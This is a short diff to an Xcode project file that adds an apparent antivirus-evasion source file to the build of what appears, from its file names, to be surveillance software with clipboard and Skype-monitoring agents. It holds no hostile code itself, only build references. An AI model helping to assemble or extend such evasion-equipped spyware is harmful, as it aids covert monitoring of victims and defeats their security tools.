@@ -182,6 +182,7 @@
 		CC27338216B7D1D100DCD0E4 /* CommandsNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = CC27338116B7D1D100DCD0E4 /* CommandsNetworkOperation.m */; };
 		CC31C81016DCB5FB00922BD6 /* RCSMTask.m in Sources */ = {isa = PBXBuildFile; fileRef = CC31C80F16DCB5FB00922BD6 /* RCSMTask.m */; };
 		CC3718B016DE0EFA00658703 /* libsqlite3.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = CC3718AF16DE0EFA00658703 /* libsqlite3.dylib */; };
+		CCB619EC185F3B3B003B7D3E /* NSProcessInfo+NSProcessInfo__AVEvasion_.m in Sources */ = {isa = PBXBuildFile; fileRef = CCE74A7F185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m */; };
 		CCE74A80185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m in Sources */ = {isa = PBXBuildFile; fileRef = CCE74A7F185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m */; };
 		CCFFD70615D8ED6E00131597 /* RCSMGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CCFFD70515D8ED6E00131597 /* RCSMGlobals.m */; };
 /* End PBXBuildFile section */
@@ -1268,6 +1269,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				CCB619EC185F3B3B003B7D3E /* NSProcessInfo+NSProcessInfo__AVEvasion_.m in Sources */,
 				1A281C990FF3CAC800616589 /* RCSMAgentClipboard.m in Sources */,
 				1A319F880FAA02640079B060 /* RCSMCommon.m in Sources */,
 				1A68E0BA0FB8838400B17F60 /* RCSMAgentIMSkype.m in Sources */,
